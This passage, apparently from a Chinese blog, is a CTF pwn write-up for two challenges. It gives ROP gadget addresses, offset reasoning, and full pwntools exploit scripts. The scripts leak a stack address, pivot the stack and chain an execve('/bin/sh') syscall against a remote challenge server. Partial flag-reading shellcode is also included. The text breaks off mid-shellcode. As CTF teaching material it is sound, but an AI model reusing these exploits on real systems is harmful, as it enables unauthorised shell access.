&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0x080b8eb6 : pop eax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x080481c9 : pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x080df8bd : pop ecx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0806f83b : pop edx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0806d443 : int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x08048798 : leave ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		写一下payload&lt;/p&gt;
&lt;p&gt;​		栈是104+4(ebp) &amp;#x3D; 108, 溢出了 256-108 &amp;#x3D; 148字节&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh =  addr + &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload= b&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt; + b&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + p32(pop_eax)+p32(&lt;span class=&#34;number&#34;&gt;0xb&lt;/span&gt;)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p32(pop_edx)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;泄露栈地址&#34;&gt;&lt;a href=&#34;#泄露栈地址&#34; class=&#34;headerlink&#34; title=&#34;泄露栈地址&#34;&gt;&lt;/a&gt;泄露栈地址&lt;/h3&gt;&lt;p&gt;​		puts函数遇到\n才会停止,所以可以以此来泄露栈上残留的值来泄露地址,其实不一定要泄露这个,哪个都行, &lt;font color=&#34;red&#34;&gt;不过有一个问题就是,这个值会是固定的嘛… &lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		不是固定的….可以换一个泄露,但是如果覆盖了ebp的话,是不是会影响栈桢呢….&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605205630458.png&#34; alt=&#34;image-20230605205630458&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		溢出长度是不够的,需要栈迁移&lt;/p&gt;
&lt;p&gt;​		当时好像想的是先把&amp;#x2F;bin&amp;#x2F;sh写到一个地方…&lt;/p&gt;
&lt;p&gt;这是做的时候写的exp,是有概率拿到shell的…&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;#x27;./pwn1&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;101.43.247.245&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9201&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#systemaddr = 0x8048440&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh = 0x80486C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh.sendline(b&amp;#x27;A&amp;#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x80488F2&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 泄露栈地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;say&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#addr = u32(sh.recv(8)[4:8])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u32(sh.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_eax = &lt;span class=&#34;number&#34;&gt;0x080b8eb6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ebx = &lt;span class=&#34;number&#34;&gt;0x080481c9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ecx = &lt;span class=&#34;number&#34;&gt;0x080df8bd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_edx = &lt;span class=&#34;number&#34;&gt;0x0806f83b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int80 = &lt;span class=&#34;number&#34;&gt;0x0806d443&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leaveret = &lt;span class=&#34;number&#34;&gt;0x08048798&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh =  addr + &lt;span class=&#34;number&#34;&gt;0xae&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload= p32(pop_eax)+p32(&lt;span class=&#34;number&#34;&gt;0xb&lt;/span&gt;)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p32(pop_edx)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(int80) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload= b&amp;quot;/bin/sh\x00&amp;quot;*0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;)+p32(addr+&lt;span class=&#34;number&#34;&gt;0xae&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)+p32(leaveret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = payload.ljust(0x68,b&amp;quot;a&amp;quot;) +p32(0)+p32(addr+0xbe-0x78+0x10-4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr+&lt;span class=&#34;number&#34;&gt;0xae&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		查看符号 readelf objdump?&lt;/p&gt;
&lt;h2 id=&#34;pwn3&#34;&gt;&lt;a href=&#34;#pwn3&#34; class=&#34;headerlink&#34; title=&#34;pwn3&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn3&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;恶心的过滤…怎么把过滤应用到这了,&lt;/p&gt;
&lt;p&gt;主要是 一个常用的指令, push xxx, 转成字节码会有\x68,正好命中了规则,草!&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;##!/usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#context(os=&amp;#x27;linux&amp;#x27;,arch=&amp;quot;i386&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#sh = process(&amp;#x27;./pwn3&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&amp;quot;101.43.247.245&amp;quot;,9202)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#systemaddr = 0x8048440&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#binsh = 0x80486C0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#sh.sendline(b&amp;#x27;A&amp;#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch= &amp;#x27;x86&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x8048967&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(b&amp;quot;say&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(b&amp;quot;a&amp;quot;*0x60+p32(0)+p32(0x99999)+b&amp;quot;d&amp;quot;*8)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#sh.sendline(b&amp;quot;a&amp;quot;*0x70)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#addr = u32(sh.recv(8)[4:8])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(0x70)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u32(sh.recv(4))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(addr+0xbe-0x90+0x28+4))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_eax = 0x080b8f16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ebx = 0x080481c9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ecx = 0x080df91d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_edx = 0x0806f89b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int80 = 0x0806d4a3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leaveret = 0x08048798&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr = 0x080ECDBB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmpesp = 0x080dea1f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = asm(&amp;quot;push 0x0;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        push 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov eax,0x7478742e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        push eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov  eax,0x67616c66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        push eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov ebx,esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        xor ecx,ecx         #0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        xor edx,edx         #0&lt;/span&gt;&lt;br&gt;&lt;span 